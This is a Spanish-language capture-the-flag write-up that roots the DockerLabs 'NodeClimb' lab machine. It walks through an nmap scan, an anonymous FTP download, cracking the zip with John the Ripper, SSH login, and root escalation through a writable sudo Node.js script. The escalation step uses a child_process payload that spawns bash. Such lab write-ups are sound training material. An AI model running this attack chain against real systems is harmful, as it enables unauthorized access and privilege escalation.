---
icon: linux
---

**Plataforma:** Dockerlabs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `FTP` `Node.js` `Anonymous FTP` `John The Ripper` `Cracking` `Sudoers` `Writable File`

## INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash
unzip nodeclimb.zip
```

La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh nodeclimb.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
```

```bash
nmap -n -Pn -sCV -p21,22 --min-rate 5000 172.17.0.2
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 16:16 CET
Nmap scan report for 172.17.0.2
Host is up (0.000032s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             242 Jul 05  2024 secretitopicaron.zip
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 cd:1f:3b:2d:c4:0b:99:03:e6:a3:5c:26:f5:4b:47:ae (ECDSA)
|_  256 a0:d4:92:f6:9b:db:12:2b:77:b6:b1:58:e0:70:56:f0 (ED25519)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.91 seconds
```

El escaneo de puertos revela que el puerto `21` (FTP) está abierto y permite el inicio de sesión `anónimo`.

Nos conectamos al servicio `FTP`.

```bash
ftp 172.17.0.2
```

Info:

```
Connected to 172.17.0.2.
220 (vsFTPd 3.0.3)
Name (172.17.0.2:trihack): anonymous
331 Please specify the password.
Password: 
230 Login successful.
```

Encontramos un archivo `.zip` en el directorio raíz. Procedemos a descargar el archivo a nuestra máquina atacante.

```bash
ftp> get secretitopicaron.zip
```

Info:

```
local: secretitopicaron.zip remote: secretitopicaron.zip
229 Entering Extended Passive Mode (|||17333|)
150 Opening BINARY mode data connection for secretitopicaron.zip (242 bytes).
100% |***********************************|   242      191.51 KiB/s    00:00 ETA
226 Transfer complete.
242 bytes received in 00:00 (168.80 KiB/s)
```

Al intentar descomprimirlo en nuestra máquina, se nos solicita una contraseña.

```bash
unzip secretitopicaron.zip
```

Info:

```
Archive:  secretitopicaron.zip
[secretitopicaron.zip] password.txt password: 
   skipping: password.txt            incorrect password
```

## FUERZA BRUTA

Utilizamos la herramienta `zip2john` para extraer el `hash` de la contraseña del archivo.

```bash
zip2john secretitopicaron.zip > hash.txt
```

Info:

```
ver 1.0 efh 5455 efh 7875 secretitopicaron.zip/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=52, decmplen=40, crc=59D5D024 ts=4C03 cs=4c03 type=0
```

A continuación, procedemos a crackear el `hash`.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (secretitopicaron.zip/password.txt)     
1g 0:00:00:00 DONE (2025-10-31 16:18) 50.00g/s 204800p/s 204800c/s 204800C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Encontramos con éxito la contraseña: `password1`.

Con esta contraseña, ya podemos descomprimir el `.zip` y ver su contenido.

```bash
unzip secretitopicaron.zip
```

Info:

```
Archive:  secretitopicaron.zip
[secretitopicaron.zip] password.txt password: 
 extracting: password.txt
```

En su interior hallamos un archivo `password.txt`.

```
cat password.txt  
mario:laKontraseñAmasmalotaHdelbarrioH
```

Al leerlo, encontramos credenciales válidas para un usuario del sistema. Utilizamos estas credenciales para autenticarnos exitosamente a través del puerto `22` (SSH).

```bash
ssh mario@172.17.0.2
```

## ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo` y `SUID`.

```bash
sudo -l
```

Info:

```
Matching Defaults entries for mario on f8c3e384992e:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on f8c3e384992e:
    (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
```

Observamos que, a través del binario `node`, podemos ejecutar el archivo `script.js` con privilegios de `root`. El archivo `script.js` está vacío, pero tenemos permisos de escritura sobre él. Por lo tanto, procedemos a inyectar un `payload` de `JavaScript` que nos permita escalar privilegios.

```bash
nano script.js
```

Código:

```
require('child_process').spawn('/bin/bash', ['-p'], {stdio: 'inherit'});
```

Guardamos el archivo y, finalmente, ejecutamos el script con privilegios de `root`.

```bash
sudo /usr/bin/node /home/mario/script.js
```

Info:

```
root@f8c3e384992e:/home/mario# whoami
root
root@f8c3e384992e:/home/mario#
```

Ya somos root!
